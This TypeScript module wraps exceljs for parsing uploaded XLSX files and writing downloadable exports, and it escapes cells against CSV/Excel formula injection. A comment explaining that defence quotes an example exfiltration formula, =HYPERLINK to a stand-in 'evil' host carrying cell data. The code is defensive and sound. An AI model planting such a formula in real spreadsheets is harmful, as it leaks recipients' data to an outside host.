// Lightweight XLSX helpers backed by exceljs.
//
// Created during the 2026-05-16 security migration from `xlsx` (SheetJS CE
// 0.18.5 — unpatched Prototype Pollution + ReDoS CVEs) to `exceljs`. Wraps
// the two patterns the codebase actually uses (parse upload → objects;
// write template/export from arrays-of-arrays) so callers don't depend on
// the exceljs API directly.
//
// exceljs is loaded dynamically so the ~900 KB bundle stays out of any
// chunk that doesn't actually call into here.

type CellValue = string | number | boolean | null | undefined

export interface XlsxSheet {
  name: string
  /** Rows including header. Row 0 is the header row. */
  rows: CellValue[][]
  /** Optional character widths per column (~= old `wch` units). */
  colWidths?: number[]
}

// Flattens exceljs cell types (Date, richText, formula result, hyperlink)
// to primitives so callers can treat parsed rows like plain JSON.
function flattenCell(value: unknown): CellValue {
  if (value === null || value === undefined) return ''
  if (typeof value === 'string' || typeof value === 'number' || typeof value === 'boolean') return value
  if (value instanceof Date) return value.toISOString().slice(0, 10)
  if (typeof value === 'object') {
    const v = value as Record<string, unknown>
    if (Array.isArray(v.richText)) {
      return (v.richText as { text: string }[]).map(rt => rt.text ?? '').join('')
    }
    if ('result' in v && v.result !== undefined) return flattenCell(v.result)
    if ('text' in v && typeof v.text === 'string') return v.text
    if ('hyperlink' in v && typeof v.hyperlink === 'string') return v.hyperlink
    if ('error' in v) return ''
  }
  return String(value)
}

/**
 * Reads the first worksheet of an .xlsx/.xls buffer and returns its rows as
 * objects keyed by the header row. Drop-in replacement for:
 *   XLSX.utils.sheet_to_json(XLSX.read(buf).Sheets[XLSX.read(buf).SheetNames[0]], { defval: '' })
 */
export async function parseXlsxToObjects<T extends Record<string, CellValue>>(
  buffer: ArrayBuffer
): Promise<T[]> {
  const ExcelJS = (await import('exceljs')).default
  const wb = new ExcelJS.Workbook()
  await wb.xlsx.load(buffer)
  const ws = wb.worksheets[0]
  if (!ws) return []

  // Find the first non-empty row — treat it as the header row. Anything above
  // is metadata that gets ignored, matching SheetJS's default sheet_to_json.
  let headerRowNumber = 0
  for (let r = 1; r <= ws.rowCount; r++) {
    const row = ws.getRow(r)
    if (row.actualCellCount > 0) {
      headerRowNumber = r
      break
    }
  }
  if (headerRowNumber === 0) return []

  const headerRow = ws.getRow(headerRowNumber)
  const headers: string[] = []
  // exceljs row.values is 1-indexed: [empty, col1, col2, ...]
  const rawHeaderValues = headerRow.values as unknown[]
  for (let c = 1; c < rawHeaderValues.length; c++) {
    headers[c - 1] = String(flattenCell(rawHeaderValues[c]) ?? '').trim()
  }

  const out: T[] = []
  ws.eachRow({ includeEmpty: false }, (row, rowNumber) => {
    if (rowNumber <= headerRowNumber) return
    const values = row.values as unknown[]
    const obj: Record<string, CellValue> = {}
    let anyValue = false
    for (let c = 1; c < Math.max(values.length, headers.length + 1); c++) {
      const key = headers[c - 1]
      if (!key) continue
      const val = flattenCell(values[c])
      obj[key] = val === undefined || val === null ? '' : val
      if (val !== '' && val !== null && val !== undefined) anyValue = true
    }
    if (anyValue) out.push(obj as T)
  })
  return out
}

// CSV/Excel injection mitigation: if a cell text starts with =, +, -, @, tab
// or CR, Excel and LibreOffice interpret it as a formula. A malicious value
// like =HYPERLINK("http://evil/?"&A1, "click") exfiltrates data when the
// recipient opens the file. Prefix such cells with a single quote so the
// spreadsheet treats them as text. Numbers/booleans pass through unchanged.
//   https://owasp.org/www-community/attacks/CSV_Injection
function escapeFormulaInjection(value: CellValue): CellValue {
  if (typeof value !== 'string' || value.length === 0) return value
  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value
}

/**
 * Writes one or more sheets to an .xlsx file and triggers a browser download.
 * Drop-in replacement for the SheetJS pattern of book_new + aoa_to_sheet +
 * book_append_sheet + writeFile.
 */
export async function writeXlsx(filename: string, sheets: XlsxSheet[]): Promise<void> {
  const ExcelJS = (await import('exceljs')).default
  const wb = new ExcelJS.Workbook()
  for (const sheet of sheets) {
    // Excel limits sheet names to 31 chars; mirror SheetJS behavior.
    const ws = wb.addWorksheet(sheet.name.slice(0, 31))
    for (const row of sheet.rows) {
      ws.addRow(row.map(escapeFormulaInjection))
    }
    if (sheet.colWidths) {
      sheet.colWidths.forEach((w, i) => {
        ws.getColumn(i + 1).width = w
      })
    }
  }
  const buf = await wb.xlsx.writeBuffer()
  const finalName = filename.toLowerCase().endsWith('.xlsx') ? filename : `${filename}.xlsx`
  triggerDownload(buf, finalName)
}

function triggerDownload(buffer: ArrayBuffer | Uint8Array, filename: string): void {
  // Cast to BlobPart: at runtime both ArrayBuffer and Uint8Array are valid
  // Blob inputs, but the newer Uint8Array<ArrayBufferLike> generic does not
  // satisfy BlobPart's ArrayBufferView<ArrayBuffer> shape.
  const blob = new Blob(
    [buffer as unknown as BlobPart],
    { type: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet' },
  )
  const url = URL.createObjectURL(blob)
  const a = document.createElement('a')
  a.href = url
  a.download = filename
  document.body.appendChild(a)
  a.click()
  document.body.removeChild(a)
  // Revoke after a tick so Safari has a chance to start the download.
  setTimeout(() => URL.revokeObjectURL(url), 0)
}
